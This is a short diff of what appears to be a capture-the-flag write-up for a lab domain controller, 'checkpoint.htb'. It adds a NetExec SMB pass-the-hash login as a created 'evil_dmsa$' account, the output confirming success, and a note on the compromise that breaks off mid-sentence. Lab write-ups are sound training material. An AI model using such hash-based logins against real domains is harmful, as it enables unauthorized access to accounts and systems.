@@ -466,8 +466,14 @@ RC4: e16081eb077aca74bdbf8af12af43ac9
 I now have a kirib and an NTLM 
 
 ```python
-
+❯❯❯ nxc smb dc01.checkpoint.htb -u 'evil_dmsa$' -H '7f669d33b962f788a753ee25142f7e67'
+SMB         10.129.81.48    445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
+SMB         10.129.81.48    445    DC01             [+] checkpoint.htb\evil_dmsa$:7f669d33b962f788a753ee25142f7e67 
 ```
+
+I now have compromised this new user account
+
+This user account i created assumed the sam
 
 
 
